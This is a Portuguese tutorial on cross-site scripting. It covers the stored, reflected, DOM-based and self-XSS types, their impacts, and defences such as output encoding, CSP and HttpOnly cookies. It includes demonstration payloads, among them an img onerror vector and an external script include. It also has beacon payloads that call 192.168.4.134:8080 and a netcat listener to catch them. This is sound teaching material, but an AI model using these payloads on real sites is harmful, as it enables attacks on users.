## 🕷️ XSS — Cross-Site Scripting

### 🧠 O que é Cross-Site Scripting?

O **Cross-Site Scripting (XSS)** é uma vulnerabilidade que ocorre quando uma aplicação **não trata corretamente dados controlados pelo usuário antes de inseri-los em uma página web**.

Isso pode fazer com que o navegador interprete a entrada como **HTML ou JavaScript**, em vez de simplesmente tratá-la como texto.

👉 O código é executado no **contexto da aplicação vulnerável**, podendo interagir com o DOM e com outros recursos disponíveis para aquela página.

---

## ⚙️ Como acontece

Fluxo básico:

```text
Entrada do usuário
       ↓
Aplicação Web
       ↓
Dados inseridos na página
       ↓
Navegador interpreta como HTML/JS
       ↓
Código executado
```

Exemplo vulnerável:

```php
<?php
echo $_GET['name'];
?>
```

Se a aplicação recebe:

```text
?name=<script>alert(1)</script>
```

e simplesmente devolve o conteúdo:

```html
<script>alert(1)</script>
```

💥 O navegador pode interpretar a entrada como código.

---

# 📌 Tipos de XSS

Existem três categorias principais:

```text
Stored XSS
Reflected XSS
DOM-based XSS
```

---

## 🔹 1. Stored XSS — Persistente

No **Stored XSS**, o payload é armazenado pela aplicação, geralmente em:

- banco de dados
- comentários
- fóruns
- perfil de usuário
- mensagens
- campos de cadastro

Fluxo:

```text
Atacante
   ↓
Payload
   ↓
Servidor
   ↓
Banco de dados
   ↓
Outro usuário acessa
   ↓
XSS executado
```

Exemplo:

```html
<script>alert(document.domain)</script>
```

O payload é armazenado e posteriormente entregue aos usuários que acessarem o conteúdo afetado.

💥 A vítima não precisa necessariamente clicar em um link especialmente criado pelo atacante.

---

## 🔹 2. Reflected XSS — Refletido

No **Reflected XSS**, o payload é enviado em uma requisição e **refletido imediatamente na resposta**.

Exemplo:

```text
http://exemple.com/cat.php?id=1
```

Payload:

```text
http://exemple.com/cat.php?id=2<script>alert(1)</script>
```

Fluxo:

```text
Payload
   ↓
Requisição
   ↓
Servidor
   ↓
Resposta contendo payload
   ↓
Navegador
   ↓
JavaScript executado
```

📌 É comum que o atacante precise induzir a vítima a acessar uma URL especialmente criada, por exemplo através de engenharia social.

---

## 🔹 3. DOM-Based XSS

O **DOM (Document Object Model)** representa a página HTML como objetos manipuláveis pelo JavaScript.

No **DOM-Based XSS**, a vulnerabilidade ocorre principalmente no **JavaScript executado no navegador**.

O servidor pode nem receber o payload.

Exemplo conceitual:

```javascript
const value = location.hash.substring(1);

document.getElementById("resultado").innerHTML = value;
```

URL:

```text
https://exemple.com/#<img src=x onerror=alert(1)>
```

Fluxo:

```text
URL
 ↓
JavaScript
 ↓
DOM
 ↓
innerHTML
 ↓
XSS
```

💥 O problema está no uso inseguro de dados controlados pelo usuário em um **sink** perigoso do DOM.

---

# 🆕 4. Self-XSS

O **Self-XSS** é diferente dos três tipos tradicionais.

Nesse caso, o próprio usuário é **induzido a executar código no seu navegador**, normalmente através do Console das DevTools.

Um exemplo comum de engenharia social é alguém convencer a vítima a copiar e colar um código no console:

```javascript
alert(document.domain);
```

O código é executado **no contexto da própria sessão da vítima**.

---

## 🧠 Por que Self-XSS é diferente?

Compare:

### XSS tradicional

```text
Atacante
   ↓
Aplicação vulnerável
   ↓
Payload
   ↓
Navegador da vítima
```

### Self-XSS

```text
Atacante
   ↓
Engenharia social
   ↓
Vítima cola código
   ↓
Console do navegador
   ↓
Código executado
```

👉 No Self-XSS, **não existe necessariamente uma vulnerabilidade na aplicação**. O elemento central é a engenharia social que convence o usuário a executar o código.

---

## 🧪 Exemplo de Self-XSS

No console do navegador:

```javascript
alert(document.domain);
```

Outro exemplo inofensivo:

```javascript
console.log(document.title);
```

Isso demonstra que JavaScript executado pelo próprio usuário possui acesso ao contexto da página em que foi executado.

📌 Em Bug Bounty, **Self-XSS isolado geralmente não é considerado uma vulnerabilidade**, pois depende da própria vítima executar o código. Ele se torna mais relevante quando pode ser combinado com outra vulnerabilidade ou quando existe uma forma de execução sem interação insegura do usuário.

---

# 🎯 Objetivos / Impactos

Dependendo do contexto e dos privilégios da vítima, XSS pode permitir:

- manipulação do DOM
- alteração visual da página
- execução de JavaScript
- phishing dentro da aplicação
- redirecionamento
- realização de ações em nome da vítima
- acesso a informações disponíveis para o JavaScript
- comprometimento de contas em determinados cenários

📌 **XSS não significa automaticamente roubo de cookies.**

Cookies protegidos com:

```http
HttpOnly
```

não podem ser acessados diretamente por:

```javascript
document.cookie
```

---

# 💉 Exemplos de XSS

URL original:

```text
http://exemple.com/cat.php?id=1
```

Payload simples:

```text
http://exemple.com/cat.php?id=2<script>alert(1)</script>
```

Verificação do domínio:

```html
<script>alert(document.domain)</script>
```

Outro vetor HTML:

```html
<img src=x onerror="alert(2)">
```

Carregamento de JavaScript externo:

```html
<script src="http://0.0.0.0:8080/script.js"></script>
```

📌 Para seus laboratórios, prefira payloads de demonstração como `alert()` e `document.domain`.

---

# 🤖 Exploração automática

Uma ferramenta conhecida para testes de XSS é o **XSStrike**.

Exemplo:

```bash
python3 xsstrike.py -u "http://exemple.com/cat.php?id=1"
```

O objetivo é automatizar testes e identificar possíveis contextos de XSS.

---

# 📡 Demonstração de Reflected XSS

Para verificar se um payload consegue gerar uma requisição externa em um **laboratório autorizado**, pode-se utilizar um servidor de teste.

Terminal:

```bash
nc -lvnp 8080
```

Payload conceitual:

```html
<script>
new Image().src="http://192.168.4.134:8080/";
</script>
```

Fluxo:

```text
Navegador da vítima
       ↓
JavaScript
       ↓
HTTP request
       ↓
192.168.4.134:8080
       ↓
Netcat
```

💡 Isso pode ajudar a demonstrar que o JavaScript realmente foi executado.

---

# 💾 Stored XSS

No caso de **Stored XSS**, o payload é armazenado na aplicação.

Exemplo:

```html
<script>
alert(document.domain);
</script>
```

Quando outro usuário acessa a página que contém o conteúdo armazenado:

```text
Banco de dados
      ↓
Aplicação
      ↓
HTML
      ↓
Navegador
      ↓
JavaScript
```

💥 O código é executado no navegador do usuário.

---

# 📡 Coleta de informações em laboratório

Em um **laboratório próprio**, você pode demonstrar que o navegador realizou uma requisição para um servidor controlado pelo pesquisador.

Por exemplo:

```html
<script>
new Image().src="http://192.168.4.134:8080/test";
</script>
```

No servidor:

```bash
nc -lvnp 8080
```

Isso demonstra a comunicação sem precisar coletar credenciais ou cookies reais.

---

## 🧠 XSS e Cookies

Um exemplo tradicional é:

```javascript
document.cookie
```

Porém:

```text
Cookie normal
   ↓
document.cookie
   ↓
pode ser acessível
```

Enquanto:

```text
Cookie HttpOnly
   ↓
document.cookie
   ↓
❌ não acessível pelo JavaScript
```

Por isso:

👉 **`HttpOnly` reduz significativamente o impacto de XSS relacionado ao roubo direto de cookies.**

---

# 🔐 Como prevenir XSS

### 1. Output Encoding

Dados fornecidos pelo usuário devem ser tratados de acordo com o contexto onde serão inseridos.

Por exemplo:

```html
<   → &lt;
>   → &gt;
"   → &quot;
'   → &#x27;
```

---

### 2. Evitar sinks perigosos

Evite inserir dados não confiáveis diretamente em:

```javascript
innerHTML
outerHTML
document.write()
```

Prefira:

```javascript
textContent
```

quando você quer inserir apenas texto.

---

### 3. Content Security Policy

Uma **CSP** pode reduzir o impacto de determinados XSS:

```http
Content-Security-Policy: default-src 'self'
```

Uma política adequada deve ser construída de acordo com a aplicação.

---

### 4. Cookies

Para cookies de sessão:

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

Isso adiciona camadas de proteção contra diferentes tipos de ataques.

---

# 📊 Comparação

| Tipo              | Onde ocorre       | Precisa armazenar? | Servidor participa? |
| ----------------- | ----------------- | -----------------: | ------------------: |
| **Stored XSS**    | Navegador         |                  ✅ |                   ✅ |
| **Reflected XSS** | Navegador         |                  ❌ |                   ✅ |
| **DOM XSS**       | DOM/Navegador     |                  ❌ | Pode não participar |
| **Self-XSS**      | Console/Navegador |                  ❌ |                   ❌ |

---

## 🧠 Regra de ouro

👉 **Nunca trate dados controlados pelo usuário como código.**

A aplicação deve separar:

```text
DADOS ≠ CÓDIGO
```

E, principalmente:

```text
Entrada do usuário
       ↓
Validação quando apropriado
       ↓
Contextual Output Encoding
       ↓
HTML seguro
       ↓
Navegador
```

**Resumo:** XSS ocorre quando dados controlados pelo usuário conseguem escapar do contexto de dados e passam a ser interpretados como código pelo navegador.
